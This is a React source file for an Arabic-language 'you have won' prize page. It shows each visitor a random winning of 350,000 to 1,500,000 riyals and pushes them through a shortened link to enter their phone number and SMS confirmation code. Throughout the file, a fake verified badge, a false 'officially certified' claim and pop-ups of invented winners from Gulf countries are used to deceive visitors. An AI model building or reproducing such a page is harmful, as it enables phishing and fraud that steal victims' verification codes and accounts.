import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Gift, Phone, CheckCircle, Bell, ShieldCheck } from 'lucide-react';

export default function App() {
  const prizes = ["350,000", "400,000", "500,000", "750,000", "1,000,000", "1,500,000"];
  const [prize, setPrize] = useState("");
  
  const names = ["محمد", "أحمد", "علي", "فاطمة", "محمود", "يوسف", "خالد", "عمر", "سارة", "نورة", "عبدالله", "سلمان", "فيصل", "سعود", "عبدالرحمن", "وليد", "تركي", "فهد"];
  const countries = ["السعودية", "الإمارات", "الكويت", "قطر", "عمان", "البحرين"];
  const notificationPrizes = ["350,000", "400,000", "500,000", "750,000"];

  interface Notification {
    id: number;
    name: string;
    country: string;
    amount: string;
  }

  const [currentNotification, setCurrentNotification] = useState<Notification | null>(null);

  const profileImage = "https://scontent.fcai19-5.fna.fbcdn.net/v/t39.30808-6/642736220_1463136162066263_1394146826540422364_n.jpg?_nc_cat=105&ccb=1-7&_nc_sid=1d70fc&_nc_ohc=njCy6LQeM64Q7kNvwEsQfGN&_nc_oc=AdmMhuJ3GMjshh-VOZqszbPwOPE0rG8nB7vshTSVsRuPdZgNK_NpOggeJil1NdvaxTw&_nc_zt=23&_nc_ht=scontent.fcai19-5.fna&_nc_gid=7w9mDMsRuDHMZUEJR2Yh4Q&_nc_ss=8&oh=00_Afz6l2cRM8I4EEELVsHOoK3yXA7wm50I0667_X5Un1nG6A&oe=69B373C7";

  useEffect(() => {
    setPrize(prizes[Math.floor(Math.random() * prizes.length)]);
  }, []);

  useEffect(() => {
    const showRandomNotification = () => {
      setCurrentNotification({
        id: Date.now(),
        name: names[Math.floor(Math.random() * names.length)],
        country: countries[Math.floor(Math.random() * countries.length)],
        amount: notificationPrizes[Math.floor(Math.random() * notificationPrizes.length)]
      });
      setTimeout(() => setCurrentNotification(null), 4000);
    };

    const initialTimeout = setTimeout(showRandomNotification, 5000);
    const interval = setInterval(showRandomNotification, 12000);
    return () => { clearTimeout(initialTimeout); clearInterval(interval); };
  }, []);

  return (
    <div dir="rtl" className="min-h-screen bg-[#f8fafc] text-slate-800 font-sans overflow-x-hidden pb-24">
      {/* Header removed as requested */}

      <main className="max-w-xl mx-auto px-4 py-8 flex flex-col items-center">
        {/* Profile Section */}
        <motion.div 
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.5 }}
          className="flex flex-col items-center mb-8"
        >
          <div className="relative mb-2">
            <div className="w-28 h-28 rounded-full p-1 bg-gradient-to-tr from-emerald-400 to-teal-600 shadow-lg">
              <img 
                src={profileImage} 
                alt="Profile" 
                className="w-full h-full rounded-full object-cover border-4 border-white"
              />
            </div>
            <div className="absolute bottom-0 left-0 bg-white rounded-full p-0.5 shadow-sm">
              <svg viewBox="0 0 24 24" className="w-7 h-7 text-blue-500 fill-current" aria-label="Verified account">
                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.9 14.7L6 12.6l1.5-1.5 2.6 2.6 6.4-6.4 1.5 1.5-7.9 7.9z"></path>
              </svg>
            </div>
          </div>
        </motion.div>

        {/* Prize Card */}
        <motion.div 
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ duration: 0.5, delay: 0.1 }}
          className="w-full bg-white rounded-3xl p-8 shadow-xl shadow-slate-200/50 border border-slate-100 text-center relative overflow-hidden mb-8"
        >
          <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-emerald-400 to-teal-500"></div>
          
          <h2 className="text-lg font-bold text-slate-600 mb-4">
            انت الرابح بمبلغ
          </h2>
          
          <div className="mb-6">
            <span className="block text-5xl md:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r from-emerald-600 to-teal-600">
              {prize} <span className="text-2xl text-emerald-600">ريال</span>
            </span>
          </div>
          
          <p className="text-slate-500 text-sm font-medium mb-8">
            ادخل رقم هاتفك من هنا للحصول على المبلغ
          </p>

          <a 
            href="https://smrturl.co/6367a65"
            className="group relative flex items-center justify-center w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-xl py-4 rounded-2xl shadow-lg shadow-emerald-500/30 transition-all active:scale-[0.98] gap-2"
          >
            <Gift className="w-6 h-6" />
            ادخل رقم هاتفك من هنا
          </a>
          
          <div className="mt-4 flex items-center justify-center gap-2 text-xs font-semibold text-slate-400">
            <ShieldCheck className="w-4 h-4 text-emerald-500" />
            <span>معتمد وموثق رسمياً</span>
          </div>
        </motion.div>

        {/* Steps */}
        <motion.div 
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ duration: 0.5, delay: 0.2 }}
          className="w-full"
        >
          <h3 className="text-lg font-bold text-slate-800 mb-6 text-center">خطوات استلام الجائزة</h3>
          
          <div className="space-y-4">
            {[
              { icon: Phone, title: "سجل بياناتك", desc: "اضغط على زر ادخل رقم هاتفك من هنا" },
              { icon: ShieldCheck, title: "أكد هويتك", desc: "أدخل رمز التأكيد (SMS) المرسل إليك." },
              { icon: CheckCircle, title: "استلم جائزتك", desc: "سيتم تحويل المبلغ فوراً إلى حسابك." }
            ].map((step, i) => (
              <a href="https://smrturl.co/6367a65" key={i} className="flex items-center gap-4 bg-white p-4 rounded-2xl border border-slate-100 shadow-sm hover:border-emerald-200 hover:shadow-md transition-all cursor-pointer">
                <div className="w-12 h-12 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center shrink-0">
                  <step.icon className="w-6 h-6" />
                </div>
                <div>
                  <h4 className="font-bold text-slate-800">{step.title}</h4>
                  <p className="text-sm text-slate-500">{step.desc}</p>
                </div>
              </a>
            ))}
          </div>
        </motion.div>
      </main>

      {/* Live Notifications */}
      <div className="fixed bottom-6 left-0 right-0 z-30 flex justify-center pointer-events-none px-4">
        <AnimatePresence>
          {currentNotification && (
            <motion.div
              initial={{ y: 50, opacity: 0, scale: 0.9 }}
              animate={{ y: 0, opacity: 1, scale: 1 }}
              exit={{ y: 20, opacity: 0, scale: 0.9 }}
              className="bg-white border border-slate-200 shadow-xl rounded-2xl p-3 flex items-center gap-3 max-w-sm w-full pointer-events-auto"
            >
              <div className="bg-emerald-100 p-2 rounded-full shrink-0 text-emerald-600">
                <Bell className="w-5 h-5" />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-sm font-bold text-slate-800 truncate">
                  {currentNotification.name} <span className="text-slate-500 font-normal text-xs">من {currentNotification.country}</span>
                </p>
                <p className="text-xs text-slate-600 mt-0.5 truncate">
                  استلم للتو <span className="text-emerald-600 font-bold">{currentNotification.amount} ريال</span>
                </p>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
